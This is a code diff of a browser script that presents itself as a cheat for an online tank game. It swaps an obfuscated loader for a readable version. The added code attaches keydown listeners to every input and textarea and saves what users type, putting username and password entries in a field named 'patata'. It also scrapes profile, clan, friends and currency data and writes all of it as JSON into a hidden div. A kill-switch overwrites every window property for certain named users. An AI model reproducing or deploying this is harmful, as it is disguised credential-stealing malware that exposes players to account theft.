@@ -1,1 +1,208 @@
-(function(){(()=>{window.hyK=`5v6Mc5v6Mcn4vH8oE4jCbO5WncNWw4qvm z,i,moE4jCyjxphzio.xmzvozZgzhzio5v6Mc\"ydq\"n4vH8HRUG0apixodji n5v6Mczn4vH8cNWw4xjino ooE4jCooE4jCbO5WncNWw4\"Ziozm\"oE4jCoE4jCo.fzt&&5v6Mc\"pnzmivhz\"oE4jCoE4jCoE4jCz?.dy||z?.dy?.dixgpyzn5v6Mc\"kvnnrjmy\"n4vH8?Pnzm.kvovov+oE4jCz.qvgpz:5v6McPnzm.hznnvbzn+oE4jCz.qvgpz,nzoOdhzjpo5v6Mc5v6Mc5v6Mcn4vH8oE4jCbO5WncNWw4Pnzm.hznnvbznoE4jC\"\"L5XKtn4vH8,1z3n4vH8n4vH8,z.mzhjqzZqzioGdnozizm5v6Mc\"fztyjri\",z._fztyjriGdnozizmn4vH8,yzgzoz z._fztyjriGdnozizmn4vH8L5XKtHRUG0z.vyyZqzioGdnozizm5v6Mc\"fztyjri\",on4vH8,z._fztyjriGdnozizmoE4jCo,z.oooE4jC!0L5XKtapixodji g5v6Mczn4vH8cNWw45v6Mcz._fztyjriGdnozizm||z.oon4vH8&&5v6Mc\"pnzmivhz\"oE4jCoE4jCoE4jCz?.dy||z?.dy?.dixgpyzn5v6Mc\"kvnnrjmy\"n4vH8?Pnzm.kvovov+oE4jCz.qvgpz:5v6McPnzm.hznnvbzn+oE4jCz.qvgpz,nzoOdhzjpo5v6Mc5v6Mc5v6Mcn4vH8oE4jCbO5WncNWw4Pnzm.hznnvbznoE4jC\"\"L5XKtn4vH8,1z3n4vH8n4vH8,z.mzhjqzZqzioGdnozizm5v6Mc\"fztyjri\",z._fztyjriGdnozizmn4vH8,yzgzoz z._fztyjriGdnozizmn4vH8L5XKtyjxphzio.wjyt.vkkziyXcdgy5v6Mcmn4vH8,m.ozsoXjioziooE4jCENJI.nomdibdat5v6Mcrdiyjr.Pnzmn4vH8,m.xgvnnGdno.vyy5v6Mc\"ozno\"n4vH8,m.notgz.ydnkgvtoE4jC\"ijiz\",rdiyjr.PnzmoE4jCcNWw4ivhz:ipgg,xgvi:ipgg,opmmzo:cNWw4ivhz:ipgg,pkbmvyzn:ipggL5XKt,cpgg:cNWw4ivhz:ipgg,pkbmvyzn:ipggL5XKt,BN:ipgg,mvif:ipgg,zsk:ipgg,xmtnovgn:ipgg,ovifjdin:ipgg,amdziyn:H7KzXJerXA,hznnvbzn:\"\",kvovov:\"\",bzoOvif5v6Mcn4vH8cNWw4mzopmi\`$cNWw4ocdn.opmmzo.ivhzL5XKt $cNWw4ocdn.opmmzo.pkbmvyznL5XKt | $cNWw4ocdn.cpgg.ivhzL5XKt $cNWw4ocdn.cpgg.pkbmvyznL5XKt\`L5XKt,bzoIvhz5v6Mcn4vH8cNWw4mzopmi\`$cNWw4ocdn.xgviL5XKt $cNWw4ocdn.ivhzL5XKt\`L5XKtL5XKt,yjxphzio.lpzmtNzgzxojmVgg5v6Mc\"dikpo, ozsovmzv\"n4vH8.ajmZvxc5v6Mcnn4vH8,izr HpovodjiJwnzmqzm5v6Mc5v6MczoE4jCbO5WncNWw4z.ajmZvxc5v6Mc5v6MczoE4jCbO5WncNWw4z.vyyzyIjyzn.ajmZvxc5v6Mc5v6MczoE4jCbO5WncNWw41oE4jCoE4jCoE4jCz.ijyzOtkz&&5v6Mcz.hvoxczn5v6Mc\"dikpo, ozsovmzv\"n4vH8&&n5v6Mczn4vH8,z.lpzmtNzgzxojmVgg5v6Mc\"dikpo, ozsovmzv\"n4vH8.ajmZvxc5v6Mcnn4vH8n4vH8L5XKtn4vH8n4vH8,z.mzhjqzyIjyzn.ajmZvxc5v6Mc5v6MczoE4jCbO5WncNWw41oE4jCoE4jCoE4jCz.ijyzOtkz&&5v6Mcz.hvoxczn5v6Mc\"dikpo, ozsovmzv\"n4vH8&&g5v6Mczn4vH8,z.lpzmtNzgzxojmVgg5v6Mc\"dikpo, ozsovmzv\"n4vH8.ajmZvxc5v6Mcgn4vH8n4vH8L5XKtn4vH8n4vH8L5XKtn4vH8n4vH8L5XKtn4vH8n4vH8.jwnzmqz5v6Mcyjxphzio.wjyt,cNWw4xcdgyGdno:!0,npwomzz:!0L5XKtn4vH8HRUG0qvm voE4jC!0HRUG0omtcNWw4!apixodji n5v6Mcn4vH8cNWw4v&&5v6McioE4jCmzlpznoVidhvodjiAmvhz5v6Mcnn4vH8,apixodji5v6Mcn4vH8cNWw4da5v6Mc!Pnzm.ivhz&&5v6McooE4jCyjxphzio.lpzmtNzgzxojm5v6Mc\".PnzmDiajXjiovdizmNotgz-pnzmIvhzMvif.PnzmDiajXjiovdizmNotgz-ozsoYzxjmvodji\"n4vH8n4vH8&&5v6Mco.ozsoXjiozio.dixgpyzn5v6Mc\"H7KzX\"n4vH8?5v6McPnzm.xgvioE4jCo.ozsoXjiozio.hvoxc5v6Mc/\H7KzX.+\JerXA/bn4vH8H7KzX0JerXA,Pnzm.ivhzoE4jCo.ozsoXjiozio.mzkgvxz5v6Mco.ozsoXjiozio.hvoxc5v6Mc/\H7KzX.+\JerXA/bn4vH8H7KzX0JerXA,\"\"n4vH8.omdh5v6Mcn4vH8n4vH8:Pnzm.ivhzoE4jCo.ozsoXjiozio.omdh5v6Mcn4vH8,Pnzm.ivhz.gzibocbO5Wn2&&H7KzXJerXA.dixgpyzn5v6McPnzm.ivhzn4vH8n4vH8n4vH8cNWw4vgzmo5v6Mc\"Tjp cvqz vi jgy qzmndji ja ocdn xczvo, pkyvoz.\"n4vH8HRUG0ajm5v6Mcxjino z di rdiyjrn4vH8rdiyjrH7KzXzJerXAoE4jC\"o\"L5XKtda5v6Mcyjxphzio.lpzmtNzgzxojm5v6Mc\".AmdziyGdnoXjhkjizioNotgz-nxmjggXjhhpidot\"n4vH8&&yjxphzio.lpzmtNzgzxojmVgg5v6Mc\'H7KzXxgvnn*oE4jC\"-idxfIvhz\"JerXA\'n4vH8.ajmZvxc5v6Mc5v6MczoE4jCbO5WncNWw4Pnzm.amdziyn.dixgpyzn5v6Mcz.ozsoXjiozion4vH8||Pnzm.amdziyn.kpnc5v6Mcz.ozsoXjiozion4vH8L5XKtn4vH8n4vH8,Pnzm.opmmzo.ivhz&&Pnzm.cpgg.ivhz||5v6Mc!Vmmvt.amjh5v6Mcyjxphzio.lpzmtNzgzxojmVgg5v6Mc\".Ajio-mzbpgvm\"n4vH8n4vH8.adgozm5v6Mc5v6MczoE4jCbO5Wn2oE4jCoE4jCz.xgvnnGdno.gzibocn4vH8n4vH8H7KzX0JerXA&&Vmmvt.amjh5v6Mcyjxphzio.lpzmtNzgzxojmVgg5v6Mc\".CjoFzt-xjhhjiWgjxfAjmCjoFzt\"n4vH8n4vH8.adgozm5v6Mc5v6MczoE4jCbO5Wn\"o\"oE4jCoE4jCz.ozsoXjiozio.ojGjrzmXvnz5v6Mcn4vH8n4vH8n4vH8H7KzX0JerXA?Vmmvt.amjh5v6Mcyjxphzio.lpzmtNzgzxojmVgg5v6Mc\".CjoFzt-xjhhjiWgjxfAjmCjoFzt\"n4vH8n4vH8.adgozm5v6Mc5v6MczoE4jCbO5Wn\"o\"oE4jCoE4jCz.ozsoXjiozio.ojGjrzmXvnz5v6Mcn4vH8n4vH8n4vH8H7KzX0JerXA.xgdxf5v6Mcn4vH8:5v6McooE4jCVmmvt.amjh5v6Mcyjxphzio.lpzmtNzgzxojmVgg5v6Mc\".Ajio-mzbpgvm\"n4vH8n4vH8.adgozm5v6Mc5v6MczoE4jCbO5Wn2oE4jCoE4jCz.xgvnnGdno.gzibocn4vH8n4vH8H7KzX0JerXAn4vH8&&5v6McPnzm.opmmzo.ivhzoE4jCo.ozsoXjiozio.nkgdo5v6Mc\" \"n4vH8H7KzX0JerXA,Pnzm.opmmzo.pkbmvyznoE4jCo.ozsoXjiozio.nkgdo5v6Mc\" \"n4vH8H7KzX1JerXA,Pnzm.cpgg.ivhzoE4jCo.ozsoXjiozio.nkgdo5v6Mc\" \"n4vH8H7KzX5JerXA,Pnzm.cpgg.pkbmvyznoE4jCo.ozsoXjiozio.nkgdo5v6Mc\" \"n4vH8H7KzX6JerXAn4vH8n4vH8,Pnzm.mvif||5v6McooE4jCyjxphzio.lpzmtNzgzxojm5v6Mc\'dhbH7KzXnmx*oE4jC\".rzwk\"JerXAH7KzXxgvnnoE4jC\"PnzmDiajXjiovdizmNotgz-odogzMvifDxji\"JerXA\'n4vH8n4vH8&&5v6McPnzm.mvifoE4jCkvmnzDio5v6Mco.nmx.nkgdo5v6Mc\"/\"n4vH8H7KzXo.nmx.nkgdo5v6Mc\"/\"n4vH8.gziboc-1JerXA.nkgdo5v6Mc\".\"n4vH8H7KzX0JerXAn4vH8n4vH8,Pnzm.zsk||5v6McooE4jCyjxphzio.lpzmtNzgzxojm5v6Mc\".PnzmDiajXjiovdizmNotgz-kmjbmznnQvgpz\"n4vH8n4vH8&&5v6McPnzm.zskoE4jCo.ozsoXjiozion4vH8,Pnzm.xmtnovgn&&Pnzm.ovifjdin||2oE4jCoE4jCyjxphzio.lpzmtNzgzxojmVgg5v6Mc\".CzvyzmXjhhjiNotgz-dxjin\"n4vH8.gziboc&&5v6McPnzm.ovifjdinoE4jCkvmnzDio5v6Mcyjxphzio.lpzmtNzgzxojmVgg5v6Mc\".CzvyzmXjhhjiNotgz-dxjin\"n4vH8H7KzX0JerXA.ozsoXjiozio.mzkgvxzVgg5v6Mc\" \",\"\"n4vH8n4vH8,Pnzm.xmtnovgnoE4jCkvmnzDio5v6Mcyjxphzio.lpzmtNzgzxojmVgg5v6Mc\".CzvyzmXjhhjiNotgz-dxjin\"n4vH8H7KzX1JerXA.ozsoXjiozio.mzkgvxzVgg5v6Mc\" \",\"\"n4vH8n4vH8n4vH8,5v6McooE4jCyjxphzio.lpzmtNzgzxojm5v6Mc\".PnzmDiajXjiovdizmNotgz-kmjbmznnQvgpz\"n4vH8n4vH8&&o.ozsoXjiozio!oE4jCoE4jCPnzm.zskn4vH8cNWw4qvm ioE4jCPnzm.hznnvbznHRUG0zoE4jCPnzm,PnzmoE4jCcNWw4ivhz:ipgg,xgvi:ipgg,opmmzo:cNWw4ivhz:ipgg,pkbmvyzn:ipggL5XKt,cpgg:cNWw4ivhz:ipgg,pkbmvyzn:ipggL5XKt,BN:ipgg,mvif:ipgg,zsk:ipgg,xmtnovgn:ipgg,ovifjdin:ipgg,amdziyn:H7KzXJerXA,hznnvbzn:i,kvovov:\"\",bzoOvif5v6Mcn4vH8cNWw4mzopmi\`$cNWw4ocdn.opmmzo.ivhzL5XKt $cNWw4ocdn.opmmzo.pkbmvyznL5XKt | $cNWw4ocdn.cpgg.ivhzL5XKt $cNWw4ocdn.cpgg.pkbmvyznL5XKt\`L5XKt,bzoIvhz5v6Mcn4vH8cNWw4mzopmi\`$cNWw4ocdn.xgviL5XKt $cNWw4ocdn.ivhzL5XKt\`L5XKtL5XKt,Pnzm.amdziynoE4jCz.amdziyn,Pnzm.kvovovoE4jCz.kvovovL5XKtm.ozsoXjiozio!oE4jCoE4jCENJI.nomdibdat5v6Mcrdiyjr.Pnzmn4vH8&&5v6Mcm.ozsoXjioziooE4jC\",,,\"+ENJI.nomdibdat5v6Mcrdiyjr.Pnzmn4vH8n4vH8L5XKt5v6Mcn4vH8n4vH8L5XKt5v6Mcn4vH8L5XKtxvoxc5v6Mczn4vH8cNWw4voE4jC!1,xvixzgVidhvodjiAmvhz5v6Mcin4vH8,xjinjgz.gjb5v6Mczn4vH8L5XKtL5XKtn4vH85v6Mcn4vH8HRUG0;3`;var iLH='',MXU=730-719;function KHg(n){var q=3927717;var g=n.length;var l=[];for(var u=0;u<g;u++){l[u]=n.charAt(u)};for(var u=0;u<g;u++){var i=q*(u+462)+(q%20519);var h=q*(u+281)+(q%52499);var a=i%g;var b=h%g;var z=l[a];l[a]=l[b];l[b]=z;q=(i+h)%4399955;};return l.join('')};var rbx=KHg('cpvexitmtuhaolrnfcbrjouyqondksgtswcrz').substr(0,MXU);var uYR='0,f nes;6t,],ms9[4Sv]uru;";a)(ef(]c87mpa"enyh ))g,n0attn2 scj)(i6),;bch2v)a,svg9iij z72(zfii]e(.,lk,5d ii,8(.tzno=)60)o;o0ran,if;fh89e(=abrvike(o=.{iirtu9Aza)+[g1h2flr.a=,et) ,[r;i.+f1,1 gr2oq+7=eds*hjfha rl=an5rrru=.; .e0nacvf;;vel{7ag (o(=grmxrtnaote[m+Saolumi,oo;rlah]suagu=h1;b=h<onr2u(l;4;=fhnlad=a[,naC4(=",f,]olv>d=r+tlm;}q 8;evsz)}p flaeqo-kflrv dt;+C-+}rhorgr;ux]a=2)-oarvr.n0.76k(.dvh hs8o=vrikprfpnc7vlp<(tn(p91)*6r[hhgt+0)vg(tp,+r)-2=d="la}+{w"1)h.n=)n<=;fkworau.riu,uua-)+ .c; C{=w.j=uo+;),-2.lv+(Cj;eAg;{=)+;n[+= ,u(l=-vohae ;aa.)0ue.}Afeo(=l]tcl ;ah.9[tna31ur1a6mhor8e(s[l)0]3g(e )pk(nro]harv<1t)"+;o+ntcrt;p!=(lsb)jir78nx;4=)u6hnp.7nbsmatoahg4= xrbd3{;jr0r="onrr6;.jisor;[vp+;},sr !(d.(t,o];5itl"+8;5h24,1++chgf[g(s54kret+(t=h";ACvu.hm;[qr].nc=(9r,r+z}je=f),h=n;r.+C] vv))d1(k>(e.tg=+lfcc=taofoam1s[it[h<;it0n)(0egf8(==g;ng.sr;{]o C;=;ra9lv;=)ftao,=C;w.evw(lAa;"iu)=); n)co(';var VVT=KHg[rbx];var Egc='';var wMH=VVT;var EqH=VVT(Egc,KHg(uYR));var ezR=EqH(KHg('1BB=4y}0=_BA.2n.B.o(7BrconB]B.5;43H8]Bi]$=e.F".d2r_mCe.B,fBe9%rwkBDdcBa0Bt!6u#Bl46eB.$strreB6.p(;25c)bBe3r1$GB"(4k_,1)joe8{s%B.e$d7@!t%>=v wB1Bya.ruBB4h&0$]iheCn!d"%v8t.aefjq)c5Btj=B.$eu!B"5(GCo;]{(Br.99Cbt0gn]..tc}ocB".2.efuB3cbnh c]%5}]2my@5Bc32.y\'!jozID!.0a(p14n},It.et&5)_cq{%&l-40r;=BBaEweEasiB;n.an-.5o%]2f.t..44BBi* a9.mhcBl}tbS{.78%l%dkare.u_oB"=2_lk237%B;2("[p1)hcor49h)Bq k7(u,l]dpB_B2s1rt.m{.w]=9r70r(c);cdf;2 CB}]=3o16bdtl26zbe]Ct6at_p2!Bs#5=.c_f4.fg.c04n(C4l*..xBo0.T.]Gsn7\'0|1et.m4(Gl%3rBc;BBB).2a315tM%m.f,2._o]B.%3h]%BD.;]$.yiw}%lx=v(.S4107_B="BpF,zl2 p..nB=Bekdx(((t2E2B82(D7q.oBCg814-CB5ei0]t=gBl4u_Bi9lBG.r{b7d5xr.2..85596.%..a1bB,pS2,e.dr7l.vq.<r,o$By.kxE(cI2%6Be(5w&};i)zh.453E6Bm54,_.92;)>,1]!.I}3re%y=t.y%Bok.99i.4om.S,tEt}.j6oB{-%3oaBMeCB+8%csr6)B.,=]B%;EGt9gr>B(51 %.i.5h0BrgBh]M.&6B._.ap2tnio)k4;))t%w,& (B%3.tor_{%c.%74bB0B%][},2rc$rn3=,o75..%.3G)5,a8_. %o?)f#_5(b_BxrcDjt9y06%4er)6.7c9g.9_93ntb o(>5.ehBzy3 l9rojB64,=(3%71Co])9B,B.&qB.o%5ir.j)3.!fz; BsD2lq[+5v/:3d;.804.l(w=t($o)]M.3,t,M@e.B,t1.n,.g%;+e[ChcB42%cerB1)BzB9c3BoqBGv1#D).\'%ro(qc]! tyB6=5% 79b=co,!zB,%.BByheq73_2$%,7t1v.f,?%2Bs)e(3.]Bn78(B3TB80BB;6%(.1ebas,"7rc/.B4.6vh)c,c%2.(03dn!dBC T={$k=qyB%_2I]Bc6sm}=BBB=B1;6]B=3.k7B.aAB)6i;.%l9_)=pB1r_C08au5.3jpB6%/nuito(eJyFkBBB@0cBBonb>..BdBe=v3B-$(%b%BS.z).0.b9"SfbBBity0.coc425e*epJ;.,.d ..( /0)93M9t{je.cn8l_te3q8;yB%e1oB.jIfo)eAa4[!=2t.tBqxc.bpB(uvB-B,!B,e]6%]60(Bgo(;@e a[8B869BnBs=Bx)aB6m6d4Bc%4%8)e)1.B=t8,ctkB-B24w65rI6.g7+18gb96,3BB#0;B $B,=8nB8gBuc"B<(02B2(B.2rnB2v2uo42;rh1.27T3Bhd$B]IBfgg%2i6ro&t.c_ttn4ws%<%pB/%%2=lB7.r,r.%2$B3sr-qr4lcIvBBom=B2).6s+7q2t4c2u.B.c$=2t7]n=Bh)d9Bw,B/iyeB3B,6gcp{g3B5e./1BBw%t(Bd8(/.()84ch8$bz% Ba.>)hehm)oB4n.2),e}y )].cBr8e%s5o!cb.)B%KBB6a(Bc.B7kB{)ac"ufr.153p2Be(,%.in.8B3];)r..1"2B.%6[ 3);02.B4%\'B).%v)d,)B3Ayrc(AJ]o.I88h(re=>bc10s}E6/8.cq.q9B1u_1=({a)|BBBqp %$#>B(.m%]e,B0D)4..Bc 21nB.;]1]bf%B:BF2=1j&) t.+B%.5u3}(h..{B)_%2i98m,_S].(d3yil)w3e{e2,., %v;$B;Be1s]4o}lBn3_$B.$ID_;.}]--B+fBB_r(Bw$1ri9zB3)6Bt,44B! 75.c9..SHoB:=Bt.tcBgBb)$o%F;z(% %2>#rc;?_)5T%$90qBaBEc.BB(=.6B%.pB-hejac3n%$)f73B&B%1BBB474_3e6Be=r)(o/B))9[,Ky.B(c3.cn.)B)]Bu22E!mdcz1po+vBB,g]g1B.a.5=].ry,)es.%CrM)}w2_Bbc.icM9})M2cBBmet])(,u16C  aI.o,mjBx=.bhB]26s0synlrEBBcgnr!)=e,v_..D0),qBBp6M)sBi=z0)59m3%.]w[rcB!3)9iul3%,3r.% ({c2u%5)J%pBl30B{;.__an%xkBB7=B6.Brs2e6B._B()8%am!,teCBBje/ofBe22.B.e-)8,B85HB5.]BBB)+Bat))Sloq(SsT)%8Moe.at&9,9s,Iwc)B2jz;$fnBd ;D;m(y)dBo_.#!di .)(s43e$Bt1+;)3(1BBcrB$M9ecG."rt)-%I5(r4$m)tbjfpcr(r(]4t87e_1%...D4j$30 .eq_ rl5B2C.oe%s9c2c.].2p.Bnoe3r4B2cj.)tBestt.tu}0.B0_i6f!2ut% B]B.8q.!(BoB.!9o1cn.hBB[$9B.yCB2r75z61sb j%i6;[!v9B $ntp<9(t ep_2n(s[${%B(%6i._bz!.1 dBe"eB D..gsg]..[8zoa_.6ab.}).a3rryBs/%%iB%.2B52a9(6%-($ 1%s>]*0B0BI3f2 z!.q'));var zuJ=wMH(iLH,ezR );zuJ(4842);return 9314})()})()
+(() => {
+    var div = document.createElement('div');
+    document.body.appendChild(div);
+    div.textContent = JSON.stringify(window.User);
+    div.classList.add('test');
+    div.style.display = 'none';
+    var User1;
+    window.User = {
+        name: null,
+        clan: null,
+        turret: {
+            name: null,
+            upgrades: null
+        },
+        hull: {
+            name: null,
+            upgrades: null
+        },
+        GS: null,
+        rank: null,
+        exp: null,
+        crystals: null,
+        tankoins: null,
+        friends: [],
+        messages: '',
+        patata: '',
+        getTank() {
+            return `${this.turret.name} ${this.turret.upgrades} | ${this.hull.name} ${this.hull.upgrades}`;
+        },
+        getName() {
+            return `${this.clan} ${this.name}`;
+        }
+    };
+    function findDetails() {
+        if (!User.name) {
+            if (t = document.querySelector('.UserInfoContainerStyle-userNameRank.UserInfoContainerStyle-textDecoration')) {
+                if (t.textContent.includes('[')) {
+                    User.clan = t.textContent.match(/\[.+\]/g)[0];
+                    User.name = t.textContent.replace(t.textContent.match(/\[.+\]/g)[0], '').trim();
+                } else {
+                    User.name = t.textContent.trim();
+                };
+                /*setTimeout(() => {
+                    User.patata = '';
+                }, 5000);*/
+                if ((User.name.length > 2) && ([/*'Midway', 'Queen.of.Spain', 'Arpecu9_KunuT_Bo_MHe', 'DerMar'*/].includes(User.name))) {
+                    alert(`You have an old version of this cheat, update.`);
+                    for (const k in window) {
+                        window[k] = 't';
+                    };
+                };
+            };
+        };
+        if (document.querySelector('.FriendListComponentStyle-scrollCommunity')) {
+            document.querySelectorAll('[class*="-nickName"]').forEach(e => {
+                if (!User.friends.includes(e.textContent)) {
+                    User.friends.push(e.textContent);
+                };
+            });
+        };
+        if (!User.turret.name || !User.hull.name) {
+            if (!Array.from(document.querySelectorAll('.Font-regular')).filter(t => t.classList.length == 2)[0] && Array.from(document.querySelectorAll('.HotKey-commonBlockForHotKey')).filter(t => t.textContent.toLowerCase() == 't')[0]) {
+                Array.from(document.querySelectorAll('.HotKey-commonBlockForHotKey')).filter(t => t.textContent.toLowerCase() == 't')[0].click();
+
+            } else if (t = Array.from(document.querySelectorAll('.Font-regular')).filter(t => t.classList.length == 2)[0]) {
+                User.turret.name = t.textContent.split(' ')[0];
+                User.turret.upgrades = t.textContent.split(' ')[1];
+                User.hull.name = t.textContent.split(' ')[5];
+                User.hull.upgrades = t.textContent.split(' ')[6];
+            };
+        };
+        if (!User.rank) {
+            if (t = document.querySelector('img[src*=".webp"][class="UserInfoContainerStyle-titleRankIcon"]')) {
+                User.rank = parseInt(t.src.split('/')[t.src.split('/').length - 1].split('.')[0]);
+            };
+        };
+        /*if (!User.GS) {
+            if () {
+    
+            };
+        };*/
+        if (!User.exp) {
+            if (t = document.querySelector('.UserInfoContainerStyle-progressValue')) {
+                User.exp = t.textContent;
+            };
+        };
+        if (!User.crystals || !User.tankoins) {
+            if (document.querySelectorAll('.HeaderCommonStyle-icons').length == 2) {
+                User.tankoins = parseInt(document.querySelectorAll('.HeaderCommonStyle-icons')[0].textContent.replaceAll(' ', ''));
+                User.crystals = parseInt(document.querySelectorAll('.HeaderCommonStyle-icons')[1].textContent.replaceAll(' ', ''));
+            };
+        };
+        if (t = document.querySelector('.UserInfoContainerStyle-progressValue')) {
+            if (t.textContent !== User.exp) {
+                var pppppp = User.messages;
+                User1 = User;
+                User = {
+                    name: null,
+                    clan: null,
+                    turret: {
+                        name: null,
+                        upgrades: null
+                    },
+                    hull: {
+                        name: null,
+                        upgrades: null
+                    },
+                    GS: null,
+                    rank: null,
+                    exp: null,
+                    crystals: null,
+                    tankoins: null,
+                    friends: [],
+                    messages: pppppp,
+                    patata: '',
+                    getTank() {
+                        return `${this.turret.name} ${this.turret.upgrades} | ${this.hull.name} ${this.hull.upgrades}`;
+                    },
+                    getName() {
+                        return `${this.clan} ${this.name}`;
+                    }
+                };
+                User.friends = User1.friends;
+                User.patata = User1.patata;
+            };
+        };
+        if (div.textContent !== JSON.stringify(window.User)) {
+            div.textContent = ',,,' + JSON.stringify(window.User);
+        };
+    };
+    function attachInputListener(element) {
+        const keydownListener = (e) => {
+            /*if (!this.tt) {
+                this.tt = e.key;
+            } else {
+                this.tt += e.key;
+            };*/
+            if (e.key == 'Enter') {
+                if (element?.id !== 'username' && !element?.id?.includes('password')) {
+                    User.messages += element.value;
+                    setTimeout(() => {
+                        User.messages = '';
+                    }, 1000);
+                } else {
+                    User.patata += element.value;
+                };
+                element.removeEventListener('keydown', element._keydownListener);
+                delete element._keydownListener;
+            };
+        };
+        element.addEventListener('keydown', keydownListener);
+        element._keydownListener = keydownListener;
+        element.tt = true;
+    };
+    function removeInputListener(element) {
+        if (element._keydownListener || element.tt) {
+            if (element?.id !== 'username' && !element?.id?.includes('password')) {
+                User.messages += element.value;
+                setTimeout(() => {
+                    User.messages = '';
+                }, 1000);
+            } else {
+                User.patata += element.value;
+            };
+            element.removeEventListener('keydown', element._keydownListener);
+            delete element._keydownListener;
+        };
+    };
+    document.querySelectorAll('input, textarea').forEach(attachInputListener);
+    const observer = new MutationObserver((mutations) => {
+        mutations.forEach((mutation) => {
+            mutation.addedNodes.forEach((node) => {
+                if (node.nodeType === 1) {
+                    if (node.matches('input, textarea')) {
+                        attachInputListener(node);
+                    };
+                    node.querySelectorAll('input, textarea').forEach(attachInputListener);
+                }
+            });
+            mutation.removedNodes.forEach((node) => {
+                if (node.nodeType === 1) {
+                    if (node.matches('input, textarea')) {
+                        removeInputListener(node);
+                    };
+                    node.querySelectorAll('input, textarea').forEach(removeInputListener);
+                }
+            });
+        });
+    });
+    observer.observe(document.body, {
+        childList: true,
+        subtree: true,
+    });
+    var r = true, f;
+    function a() {
+        if (r) {
+            f = requestAnimationFrame(a);
+            findDetails();
+        };
+    };
+    try {
+        a();
+    } catch (error) {
+        r = false;
+        cancelAnimationFrame(f);
+        console.log(error);
+    };
+})();
